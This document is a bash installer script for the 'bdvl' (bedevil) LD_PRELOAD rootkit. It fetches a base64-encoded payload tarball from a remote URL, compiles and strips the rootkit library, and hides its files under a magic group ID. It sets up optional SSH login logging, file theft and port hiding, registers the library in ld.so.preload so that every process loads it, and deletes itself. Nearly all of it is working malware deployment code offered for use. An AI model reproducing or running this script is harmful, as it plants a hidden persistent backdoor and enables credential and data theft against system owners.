#!/bin/bash

# the following is required for this to work as intended:
#   - wget or curl, base64 & tar
#   - ssl (if your build uses it...)

# change this to wherever you've got your's uploaded.
B64TARGZ_LOCATION="https://url.to/tar.gz.b64"
# no need to touch anything else...

WORKDIR="/tmp" # enter this directory when installing

bin_path(){ echo -n `which $1 2>/dev/null || echo -n "nahhh"`; }
dlfile(){ # $1 = src, $2 = dest
    [ $DWNLDR == "wget" ] && wget --quiet $1 -O $2 >/dev/null
    [ $DWNLDR == "curl" ] && curl --silent $1 -o $2 >/dev/null
}

# no need to manually change these settings anymore.
ACCEPT_USE_SSL=0; USE_CRYPT=0; HIDE_SELF=0
HIDE_PORTS=0; FILE_STEAL=0; LOG_SSH=0
read_toggles(){ # $1 = path of conf
    local conf="$1"
    while read -r line; do
        [ "$line" == 'ACCEPT_USE_SSL=1' ] && ACCEPT_USE_SSL=1
        [ "$line" == 'USE_CRYPT=1' ] && USE_CRYPT=1
        [ "$line" == 'HIDE_SELF=1' ] && HIDE_SELF=1
        [ "$line" == 'HIDE_PORTS=1' ] && HIDE_PORTS=1
        [ "$line" == 'FILE_STEAL=1' ] && FILE_STEAL=1
        [ "$line" == 'LOG_SSH=1' ] && LOG_SSH=1
    done <<< "`cat $conf`"
}

SCRIPT_PATH="`pwd`/$0"

# do prerequisite checks now
[ `id -u` != 0 ] && { echo "not root" && exit; }

[ -f `bin_path wget` ] && DWNLDR="wget"
[ -f `bin_path curl` ] && [ -z $DWNLDR ] && DWNLDR="curl"
[ -z $DWNLDR ] && { echo "you need wget or curl... install either." && exit; }
[ ! -f `bin_path base64` ] && { echo "missing base64 util, install it." && exit; }
[ ! -f `bin_path tar` ] && { echo "missing tar. install it." && exit; }

echo "beginning setup & installation of bdvl using $0"
echo "   before you continue, make sure that any dependencies"
echo "   that are required by your setup of bdvl are installed"
echo "   on this box. failure to do so will mess everything up."
echo "press enter to continue."
read

echo "entering $WORKDIR" && cd $WORKDIR

B64TARGZ_FILENAME="`basename $B64TARGZ_LOCATION`"
echo "got base64'd tar.gz path"

[[ "$B64TARGZ_LOCATION" != *"/"* ]] && { echo "no path in url." && exit; }

# is host is a domain name
[[ "$B64TARGZ_LOCATION" == "http"* ]] && \
    HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $3}'`"
# or an ip??
[[ "$B64TARGZ_LOCATION" != "http"* ]] && \
    HOST="`echo -n "$B64TARGZ_LOCATION" | awk -F/ '{print $1}'`"
echo "got host $HOST"

echo "seeing if host is up"
ping -c 1 $HOST >/dev/null || { echo "no response from host... why?" && exit; }
echo "host up, starting download"

echo "downloading b64 tarball"
dlfile $B64TARGZ_LOCATION $B64TARGZ_FILENAME

TARGZ_NAME="${B64TARGZ_FILENAME}.tar.gz"
echo "archive name: $TARGZ_NAME"

echo "reverting b64'd tarball back to regular tarball"
cat $B64TARGZ_FILENAME | base64 -d > $TARGZ_NAME || { echo "something went wrong converting b64 to original" && exit; }
[ ! -f $TARGZ_NAME ] && { echo "$TARGZ_NAME doesn't exist for whatever reason. exiting." && exit; }

INCLUDE_DIR="`tar -tzf $TARGZ_NAME | head -1 | cut -f1 -d"/"`"
echo "got $TARGZ_NAME. extracting it..."
tar xvpfz $TARGZ_NAME >/dev/null && echo "tarball extracted, removing it" && rm $TARGZ_NAME $B64TARGZ_FILENAME

echo "got $INCLUDE_DIR, reading settings from $INCLUDE_DIR/settings"
settings=(`cat $INCLUDE_DIR/settings | grep -o '^[^#]*'`)
MAGIC_GID=${settings[0]} && INSTALL_DIR=${settings[1]}
LDSO_PRELOAD=${settings[2]} && BDVLSO=${settings[3]}
SOPATH=${settings[4]} && HIDEPORTS=${settings[5]}
SSH_LOGS=${settings[6]} && INTEREST_DIR=${settings[7]}
BD_VAR=${settings[8]}

echo "reading toggle statuses from toggles.conf"
read_toggles $INCLUDE_DIR/toggles.conf

echo "MAGIC_GID: $MAGIC_GID"; echo "INSTALL_DIR: $INSTALL_DIR"
echo "LDSO_PRELOAD: $LDSO_PRELOAD"; echo "BDVLSO: $BDVLSO"
echo "SOPATH: $SOPATH"; echo "BD_VAR: $BD_VAR"
[ $HIDE_PORTS == 1 ] && echo "HIDEPORTS = $HIDEPORTS"
[ $LOG_SSH == 1 ] && echo "SSH_LOGS = $SSH_LOGS"
[ $FILE_STEAL == 1 ] && echo "INTEREST_DIR = $INTEREST_DIR"

echo "all good, beginning installation"

echo "compiling bdvl"
LINKER_FLAGS=(-ldl)
[ $USE_CRYPT == 1 ] && LINKER_FLAGS+=(-lcrypt)
[ $ACCEPT_USE_SSL == 1 ] && LINKER_FLAGS+=(-lssl)
WARNING_FLAGS="-Wall" && OPTIMIZATION_FLAGS="-O0 -g0"
OPTIONS="-fomit-frame-pointer -fPIC" && LINKER_OPTIONS="-Wl,--build-id=none"
PLATFORM="`uname -m`"
[ $PLATFORM == "armv7l" ] && PLATFORM="v7l"
[ $PLATFORM == "armv6l" ] && PLATFORM="v6l"
gcc -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS \
-I$INCLUDE_DIR -shared ${LINKER_FLAGS[*]} $LINKER_OPTIONS -o $BDVLSO.$PLATFORM
gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS \
-I$INCLUDE_DIR -shared ${LINKER_FLAGS[*]} $LINKER_OPTIONS -o $BDVLSO.i686 &>/dev/null
strip $BDVLSO.$PLATFORM 2>/dev/null || { echo "couldn't strip $BDVLSO.$PLATFORM, exiting"; exit; }
strip $BDVLSO.i686 2>/dev/null
echo "rootkit successfully compiled"
echo "installing to \$INSTALL_DIR"
[ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR/
mv $BDVLSO.$PLATFORM $INSTALL_DIR/$BDVLSO.$PLATFORM
[ -f $BDVLSO.i686 ] && mv $BDVLSO.i686 $INSTALL_DIR/$BDVLSO.i686

echo "rootkit installed to install dir..."
echo "now preparing (& hiding?) rootkit files."

echo "setting up .bashrc"
BASHRC='tty -s || return
[ ! -z $TERM ] && export TERM=xterm
[ $(id -u) != 0 ] && su root
[ $(id -u) != 0 ] && kill -9 $$
[ -f ~/BD_README ] && cat ~/BD_README | less --tilde -J -d && rm ~/BD_README

# only show .ascii on first login.
[ -f ~/.ascii ] && printf "\e[1m\e[31m`cat ~/.ascii`\e[0m\n"

alias ls="ls --color=auto"
alias ll="ls --color=auto -AlFhn"

id && who
[ -f ~/auth_logs ] && echo -e "\e[1mLogged accounts: \e[1;31m$(grep Username ~/auth_logs 2>/dev/null | wc -l)\e[0m"
[ -f ~/ssh_logs ] && echo -e "\e[1mSSH logs: \e[1;31m$(cat ~/ssh_logs | wc -l)\e[0m"'
echo -n $BASHRC > $INSTALL_DIR/.bashrc
echo -n ". .bashrc" > $INSTALL_DIR/.profile

echo "preparing the rest of the installation directory"
[ $HIDE_PORTS == 1 ] && { touch $HIDEPORTS && chmod 666 $HIDEPORTS && ln -s $HIDEPORTS $INSTALL_DIR/hideports && cat $INCLUDE_DIR/hideports > $INSTALL_DIR/hideports; }
[ $FILE_STEAL == 1 ] && { mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR && ln -s $INTEREST_DIR $INSTALL_DIR/interest_dir; }
[ $LOG_SSH == 1 ] && { touch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs; } 
if [ $HIDE_SELF == 1 ]; then
    echo "hiding all rootkit files"

    HIDE_FILES+=($LDSO_PRELOAD $INSTALL_DIR $INSTALL_DIR/*
                 $INSTALL_DIR/.bashrc $INSTALL_DIR/.profile)

    [ $LOG_SSH == 1 ] && HIDE_FILES+=($SSH_LOGS)
    [ $FILE_STEAL == 1 ] && HIDE_FILES+=($INTEREST_DIR)
    [ $HIDE_PORTS == 1 ] && HIDE_FILES+=($HIDEPORTS)

    for file in ${HIDE_FILES[@]}; do
        [ ! -f $file ] && touch $file
        chown -h 0:$MAGIC_GID $file
    done
fi

[ ! -z $NO_INSTALL ] && exit

echo "finished with the install dir, writing \$SOPATH to \$LDSO_PRELOAD"
echo -n "$SOPATH" > $LDSO_PRELOAD || { echo "failed writing to \$LDSO_PRELOAD for some reason. exiting"; exit; }
echo; printf "installation finished\nconnect using your backdoor credentials"; echo
 
echo "cleaning up"; rm -r $INCLUDE_DIR
[ -f $SCRIPT_PATH ] && rm -f $SCRIPT_PATH
echo "cleanup done"